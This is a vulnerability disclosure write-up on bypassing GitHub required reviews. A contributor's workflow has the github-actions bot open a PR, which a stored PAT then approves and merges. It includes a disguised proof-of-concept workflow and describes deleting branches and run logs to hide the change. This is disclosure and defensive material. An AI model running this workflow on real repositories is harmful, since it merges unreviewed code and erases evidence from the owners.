# Bypassing Required Reviews - Continued 

Last year Cider Security disclosed a mechanism via the GitHub Bug Bounty program that allowed a contributor
to approve their own PR using the `github-actions bot`; see [Bypassing required reviews using GitHub Actions](https://medium.com/cider-sec/bypassing-required-reviews-using-github-actions-6e1b29135cc7)

In March 2022, I discovered that the `github-actions bot` could create a PR and a contributor
could then approve the PR. The following write-up was submitted to HackerOne; however, the 
same bypass had already been disclosed in January 2022. A fix was introduced on May 3rd, 2022
to allow organization administrators to prevent the `github-actions bot` from creating a PR:

[GitHub Actions: Prevent GitHub Actions from creating and approving pull requests](https://github.blog/changelog/2022-05-03-github-actions-prevent-github-actions-from-creating-and-approving-pull-requests/)

While this fix combined with the fix for Cider Security's finding is a good
start it still leaves a few open problems.

1. The fixes are only configurable in an organization. Which means any project under a
   regular user account **cannot enable this protection**. So any repository under a user's
   account with mulitple contributors is still vulnerable.
2. The **fixes are not retro-active** - for existing organizations you need to have an
   organization administrator update the settings.
3. If you have a **Personal Access Token (PAT) stored in your GitHub Secrets** - you are
   likely **still vulnerable** as a contributor could use these techniques using the PAT
   instead of the `github-action bot` to create or approve a PR (depending on the associated
   rights for the PAT).
4. A contributor still has the ability to clean-up their tracks - as most if not all
   evidence can be deleted using the rights granted to a contributor. Specifically,
   a contributor can delete a workflow run and the associated branch - effectively
   erasing the malicious workflow file and the execution logs. The only evidence
   remaining might be emails that contain links to a workflow execution that no
   longer exists.

## Write-up

A contributor to a project can create a branch containing a workflow file that
will cause the `github-actions bot` to create a new PR. This can be done by
creating a new workflow that triggers on `push`, contains a `run` step
that simply creates a new branch, makes changes to the branch, and then pushes
the new branch to `origin`. The contributor can, within the malicious workflow
file, use one of their own Personal Access Tokens (PAT) or any PAT within the
repository's secrets that have sufficient rights to create an approval review
of the PR created by the `github-actions bot`. The malicious workflow file can
subsequently merge the PR using the same PAT or any PAT available in GitHub
Secrets.

To further extend this, if there is a PAT with sufficient rights to create a
PR it would be possible to create the a PR using the PAT from GitHub Secrets.
The result is that the generated PR would appear to be from the creator of the
PAT. The implications of this show how dangerous it currently is to store one
or more PATs in a repostiry's secrets.

### But We Use CODEOWNERS?

The above bypass works even if CODEOWNERS is used to protect the `.github`
folder - as long as the PR created by the `github-actios bot` does not modify
anything in the `.github` directory or any other protected directory. However,
even the CODEOWNERS restriction can be bypassed if there is a PAT created by a
code owner and is contained in the repository's secrets.

The reason the bypass works even when CODEOWNERS is protecting the `.github`
directory is that we are not modifying any workflow files in the `main` branch
or other protected branches. The branch created by the contributor/attacker is
not a protected branch.

### What about workflow permissions?

Workflow permissions are not a valid mechanism to prevent the bypass. Currently,
permissions are set in the workflow files themselves. Within a PR the contributor
can create or modify a workflow file to remove or modify the permissions. Any of
these changes can then be reverted during the first execution of the workflow (see
Hiding Our Tracks).

### Code Signing?

Enabling code signing requirements may appear affective as the bypass would require
the creation of commits within the execution of the Action. However, even this
could be bypassed by supplying the Action with a signing key. The signing key
could be hard-coded in the workflow file or retrieved via curl at runtime.
The primary benefit of code signing is that in a forensic investigation it
may be easier to track down the attacker or malicious commits. Also, there
is no association between the signed commit and the creator of the PR; one
could create a random new user on GitHub, create and publish the key, and
then use the private key in the workflow to sign the commits.

### Forked Repositories

The above bypass only works for contributors. I do not believe a forked repository
could be used to bypass required reviews.

### Hiding Our Tracks

In the POC, some techniques are shown that could be used to make the attack
less visible - even removing the malicous workflow file that causes the
`github-actions bot` to create a PR. A contributor can delete the branches
created during the attack and the workflow execution - at the time of writting
this a contributor has the ability to delete a workflow execution. The only
remaining evidence is an approved, merged PR.

## Steps To Reproduce

In the steps below we will use Bob and Alice to differentiate accounts
in GitHub. Bob is the owner of the repository and Alice is a contributor.

1. Bob creates a new repository: `test-repo` and configures branch protection on `main` to require PR approvals.
2. Bob creates a PAT with public repostiroy rights and adds it to the `test-repo`'s secrets and name the secret `REPO_TOKEN`.
   - Note that as discussed above this step is not required, but makes reproducing the attack easier and does not expose anyones' PATs when recording the demo.
3. Alice clones the `test-repo`.
4. Alice creates a new branch: `git checkout -b bypass`.
   - Note that the branch name `bypass` is referenced in the malicious workflow file.
5. Alice adds/modifies the following file `.github/workflows/branch.yml`

    ```yaml
    name: Java CI

    on: 
    push:
      branches:
        - bypass

    jobs:
      build:
        runs-on: ubuntu-latest

        steps:
        - uses: actions/checkout@v2
        - name: Set up JDK 11
            run: |
            git config --global user.email "unknown@author.com"
            git config --global user.name "Unknown Author"
            git fetch
            git checkout main
            git pull origin main
            git checkout -b dangerous
            echo "# Unexpected File" > dangerous.md
            echo "" >> dangerous.md
            echo "This file was introduced by bypassing required reviews on the repository" >> dangerous.md
            git add dangerous.md
            git commit -am 'initial version'
            git push origin dangerous
        - name: Build with Maven
            id: step1
            uses: actions/github-script@v6
            with:
            result-encoding: string
            script: |
                await github.rest.pulls.create({
                    owner: context.repo.owner,
                    repo: context.repo.repo,
                    head: 'dangerous',
                    base: 'main',
                    title: 'Minor Update'
                });
                var token = 'ghp_' + '[removed]' + '[github]' + '[token]';
                return token;
        - name: Tests with Maven
            uses: actions/github-script@v6
            with:
            github-token: ${{ secrets.REPO_TOKEN }}
            #github-token: ${{ steps.step1.outputs.result }}
            #note that the attacker has to know what the next PR # will be and update the script below appropriately
            script: |
                var prNumber=2;
                await github.rest.pulls.createReview({
                    owner: context.repo.owner,
                    repo: context.repo.repo,
                    pull_number: prNumber,
                    event: 'APPROVE'
                })
                await github.rest.pulls.merge({
                    owner: context.repo.owner,
                    repo: context.repo.repo,
                    pull_number: prNumber
                })
        - name: Clean with Maven
            run: |
            #delete the bypass and dangerous branch
            curl -s -X DELETE -u jeremylong:${{ steps.step1.outputs.result }} https://api.github.com/repos/${{ github.repository }}/git/refs/heads/bypass
            curl -s -X DELETE -u jeremylong:${{ steps.step1.outputs.result }} https://api.github.com/repos/${{ github.repository }}/git/refs/heads/dangerous              
    ```

6. Alice then pushes the `bypass` branch.
7. The malicious workflow file, `branch.yml`, will execute and
   create a new branch and PR using the `github-action bot`, approve and
   merge the PR using the PAT stored in GitHub Secrets, and finally
   delete the `bypass` and newly created `dangerous` branch.
8. Alice can then delete the workflow executions for the `bypass` branch
   and any workflow executions that were kicked off for the dangerous
   branch.
9. The `main` branch will now contain the `dangerous.md` file.

## Recommendations

1. For organization - ensure that GitHub Actions cannot approve or create PRs.
2. For user owned repos with multiple contributors - open support tickets with GitHub to make the protections not just at the organization leve but also at the repository level.
3. NEVER store a PAT in GitHub Secrets.
